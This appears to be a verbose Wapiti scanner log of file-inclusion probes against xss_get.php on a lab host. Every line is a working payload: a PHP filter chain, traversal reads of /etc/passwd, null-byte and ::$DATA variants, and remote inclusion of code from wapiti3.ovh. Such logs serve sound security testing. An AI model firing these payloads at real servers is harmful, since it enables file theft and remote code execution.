2024-03-20 16:49:38.225 | VERBOSE  | wapitiCore.net.explorer:_async_analyze:286 - [+] GET http://web/xss_get.php?lastname=fuzz&firstname=fuzz&form=submit (0)
2024-03-20 16:49:44.832 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/xss_get.php?lastname=php%3A%2F%2Ffilter%2Fconvert.iconv.UTF8.CSISO2022KR%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.SE2.UTF-16%7Cconvert.iconv.CSIBM921.NAPLPS%7Cconvert.iconv.855.CP936%7Cconvert.iconv.IBM-932.UTF-8%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.SE2.UTF-16%7Cconvert.iconv.CSIBM1161.IBM-932%7Cconvert.iconv.MS932.MS936%7Cconvert.iconv.BIG5.JOHAB%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.IBM869.UTF16%7Cconvert.iconv.L3.CSISO90%7Cconvert.iconv.UCS2.UTF-8%7Cconvert.iconv.CSISOLATIN6.UCS-4%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.8859_3.UTF16%7Cconvert.iconv.863.SHIFT_JISX0213%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.851.UTF-16%7Cconvert.iconv.L1.T.618BIT%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.CSA_T500.UTF-32%7Cconvert.iconv.CP857.ISO-2022-JP-3%7Cconvert.iconv.ISO2022JP2.CP775%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.IBM891.CSUNICODE%7Cconvert.iconv.ISO8859-14.ISO6937%7Cconvert.iconv.BIG-FIVE.UCS-4%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.L5.UTF-32%7Cconvert.iconv.ISO88594.GB13000%7Cconvert.iconv.BIG5.SHIFT_JISX0213%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.UTF8.CSISO2022KR%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.CP1162.UTF32%7Cconvert.iconv.L4.T.61%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.UTF8.CSISO2022KR%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.IBM869.UTF16%7Cconvert.iconv.L3.CSISO90%7Cconvert.iconv.R9.ISO6937%7Cconvert.iconv.OSF00010100.UHC%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.UTF8.CSISO2022KR%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.863.UTF-16%7Cconvert.iconv.ISO6937.UTF16LE%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.CP-AR.UTF16%7Cconvert.iconv.8859_4.BIG5HKSCS%7Cconvert.iconv.MSCP1361.UTF-32LE%7Cconvert.iconv.IBM932.UCS-2BE%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.CP-AR.UTF16%7Cconvert.iconv.8859_4.BIG5HKSCS%7Cconvert.iconv.MSCP1361.UTF-32LE%7Cconvert.iconv.IBM932.UCS-2BE%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.L6.UNICODE%7Cconvert.iconv.CP1282.ISO-IR-90%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.SE2.UTF-16%7Cconvert.iconv.CSIBM1161.IBM-932%7Cconvert.iconv.BIG5HKSCS.UTF16%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.SE2.UTF-16%7Cconvert.iconv.CSIBM921.NAPLPS%7Cconvert.iconv.855.CP936%7Cconvert.iconv.IBM-932.UTF-8%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.8859_3.UTF16%7Cconvert.iconv.863.SHIFT_JISX0213%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.CP1046.UTF16%7Cconvert.iconv.ISO6937.SHIFT_JISX0213%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.CP1046.UTF32%7Cconvert.iconv.L6.UCS-2%7Cconvert.iconv.UTF-16LE.T.61-8BIT%7Cconvert.iconv.865.UCS-4LE%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.MAC.UTF16%7Cconvert.iconv.L8.UTF16BE%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.CSIBM1161.UNICODE%7Cconvert.iconv.ISO-IR-156.JOHAB%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.INIS.UTF16%7Cconvert.iconv.CSIBM1133.IBM943%7Cconvert.iconv.IBM932.SHIFT_JISX0213%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.SE2.UTF-16%7Cconvert.iconv.CSIBM1161.IBM-932%7Cconvert.iconv.MS932.MS936%7Cconvert.iconv.BIG5.JOHAB%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.base64-decode%2Fresource%3Dphp%3A%2F%2Ftemp&firstname=fuzz&form=submit (0)
2024-03-20 16:49:44.850 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/xss_get.php?lastname=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd&firstname=fuzz&form=submit (0)
2024-03-20 16:49:44.865 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/xss_get.php?lastname=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd&firstname=fuzz&form=submit (0)
2024-03-20 16:49:44.882 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/xss_get.php?lastname=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00&firstname=fuzz&form=submit (0)
2024-03-20 16:49:44.899 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/xss_get.php?lastname=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00&firstname=fuzz&form=submit (0)
2024-03-20 16:49:44.915 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/xss_get.php?lastname=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices&firstname=fuzz&form=submit (0)
2024-03-20 16:49:44.932 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/xss_get.php?lastname=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices&firstname=fuzz&form=submit (0)
2024-03-20 16:49:44.942 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/xss_get.php?lastname=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices%00&firstname=fuzz&form=submit (0)
2024-03-20 16:49:44.951 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/xss_get.php?lastname=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices%00&firstname=fuzz&form=submit (0)
2024-03-20 16:49:44.961 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/xss_get.php?lastname=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices&firstname=fuzz&form=submit (0)
2024-03-20 16:49:44.970 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/xss_get.php?lastname=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices&firstname=fuzz&form=submit (0)
2024-03-20 16:49:44.979 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/xss_get.php?lastname=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%00&firstname=fuzz&form=submit (0)
2024-03-20 16:49:44.994 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/xss_get.php?lastname=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%00&firstname=fuzz&form=submit (0)
2024-03-20 16:49:45.009 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/xss_get.php?lastname=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd&firstname=fuzz&form=submit (0)
2024-03-20 16:49:45.023 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/xss_get.php?lastname=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd&firstname=fuzz&form=submit (0)
2024-03-20 16:49:45.037 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/xss_get.php?lastname=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00&firstname=fuzz&form=submit (0)
2024-03-20 16:49:45.049 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/xss_get.php?lastname=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00&firstname=fuzz&form=submit (0)
2024-03-20 16:49:45.059 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/xss_get.php?lastname=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices&firstname=fuzz&form=submit (0)
2024-03-20 16:49:45.068 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/xss_get.php?lastname=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices&firstname=fuzz&form=submit (0)
2024-03-20 16:49:45.078 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/xss_get.php?lastname=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices%00&firstname=fuzz&form=submit (0)
2024-03-20 16:49:45.087 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/xss_get.php?lastname=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices%00&firstname=fuzz&form=submit (0)
2024-03-20 16:49:45.098 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/xss_get.php?lastname=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices&firstname=fuzz&form=submit (0)
2024-03-20 16:49:45.108 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/xss_get.php?lastname=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices&firstname=fuzz&form=submit (0)
2024-03-20 16:49:45.118 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/xss_get.php?lastname=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%00&firstname=fuzz&form=submit (0)
2024-03-20 16:49:45.128 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/xss_get.php?lastname=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%00&firstname=fuzz&form=submit (0)
2024-03-20 16:49:45.137 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/xss_get.php?lastname=file%3A%2F%2F%2Fetc%2Fpasswd&firstname=fuzz&form=submit (0)
2024-03-20 16:49:45.147 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/xss_get.php?lastname=file%3A%2F%2FC%3A%5CWindows%5CSystem32%5Cdrivers%5Cetc%5Cservices&firstname=fuzz&form=submit (0)
2024-03-20 16:49:45.160 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/xss_get.php?lastname=....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc%2Fpasswd&firstname=fuzz&form=submit (0)
2024-03-20 16:49:45.169 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/xss_get.php?lastname=....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc%2Fpasswd%00&firstname=fuzz&form=submit (0)
2024-03-20 16:49:45.179 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/xss_get.php?lastname=....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc%2Fservices&firstname=fuzz&form=submit (0)
2024-03-20 16:49:45.188 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/xss_get.php?lastname=....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc%2Fservices%00&firstname=fuzz&form=submit (0)
2024-03-20 16:49:45.199 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/xss_get.php?lastname=....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices&firstname=fuzz&form=submit (0)
2024-03-20 16:49:45.208 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/xss_get.php?lastname=....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%00&firstname=fuzz&form=submit (0)
2024-03-20 16:49:45.218 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/xss_get.php?lastname=xss_get.php&firstname=fuzz&form=submit (0)
2024-03-20 16:49:45.227 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/xss_get.php?lastname=xss_get.php%00&firstname=fuzz&form=submit (0)
2024-03-20 16:49:45.236 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/xss_get.php?lastname=xss_get.php%3A%3A%24DATA&firstname=fuzz&form=submit (0)
2024-03-20 16:49:45.249 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/xss_get.php?lastname=fuzz&firstname=https%3A%2F%2Fwapiti3.ovh%2F%2Fe.php&form=submit (0)
2024-03-20 16:49:45.258 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/xss_get.php?lastname=fuzz&firstname=https%3A%2F%2Fwapiti3.ovh%2F%2Fe.php%00&form=submit (0)
2024-03-20 16:49:45.268 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/xss_get.php?lastname=fuzz&firstname=%2Fetc%2Fpasswd&form=submit (0)
2024-03-20 16:49:45.278 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/xss_get.php?lastname=fuzz&firstname=%2Fetc%2Fpasswd%00&form=submit (0)
2024-03-20 16:49:45.288 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/xss_get.php?lastname=fuzz&firstname=%2Fetc%2Fservices&form=submit (0)
2024-03-20 16:49:45.298 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/xss_get.php?lastname=fuzz&firstname=%2Fetc%2Fservices%00&form=submit (0)
2024-03-20 16:49:45.309 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/xss_get.php?lastname=fuzz&firstname=C%3A%5CWindows%5CSystem32%5Cdrivers%5Cetc%5Cservices&form=submit (0)
2024-03-20 16:49:45.319 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/xss_get.php?lastname=fuzz&firstname=C%3A%5CWindows%5CSystem32%5Cdrivers%5Cetc%5Cservices%00&form=submit (0)
2024-03-20 16:49:45.328 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/xss_get.php?lastname=fuzz&firstname=C%3A%5CWindows%5CSystem32%5Cdrivers%5Cetc%5Cservices%3A%3A%24DATA&form=submit (0)
2024-03-20 16:49:45.337 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/xss_get.php?lastname=fuzz&firstname=C%3A%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices&form=submit (0)
2024-03-20 16:49:45.348 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/xss_get.php?lastname=fuzz&firstname=C%3A%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%00&form=submit (0)
2024-03-20 16:49:45.358 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/xss_get.php?lastname=fuzz&firstname=C%3A%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%3A%3A%24DATA&form=submit (0)
2024-03-20 16:49:45.367 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/xss_get.php?lastname=fuzz&firstname=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Flib%2F&form=submit (0)
2024-03-20 16:49:45.376 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/xss_get.php?lastname=fuzz&firstname=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fwindows%2F&form=submit (0)
2024-03-20 16:49:45.385 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/xss_get.php?lastname=fuzz&firstname=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd&form=submit (0)
2024-03-20 16:49:45.395 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/xss_get.php?lastname=fuzz&firstname=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd&form=submit (0)
2024-03-20 16:49:45.404 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/xss_get.php?lastname=fuzz&firstname=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00&form=submit (0)
2024-03-20 16:49:45.415 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/xss_get.php?lastname=fuzz&firstname=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00&form=submit (0)
2024-03-20 16:49:45.426 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/xss_get.php?lastname=fuzz&firstname=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices&form=submit (0)
2024-03-20 16:49:45.437 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/xss_get.php?lastname=fuzz&firstname=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices&form=submit (0)
2024-03-20 16:49:45.446 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/xss_get.php?lastname=fuzz&firstname=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices%00&form=submit (0)
2024-03-20 16:49:45.456 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/xss_get.php?lastname=fuzz&firstname=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices%00&form=submit (0)
2024-03-20 16:49:45.466 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/xss_get.php?lastname=fuzz&firstname=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices&form=submit (0)
2024-03-20 16:49:45.475 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/xss_get.php?lastname=fuzz&firstname=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices&form=submit (0)
2024-03-20 16:49:45.487 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/xss_get.php?lastname=fuzz&firstname=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%00&form=submit (0)
2024-03-20 16:49:45.498 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/xss_get.php?lastname=fuzz&firstname=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%00&form=submit (0)
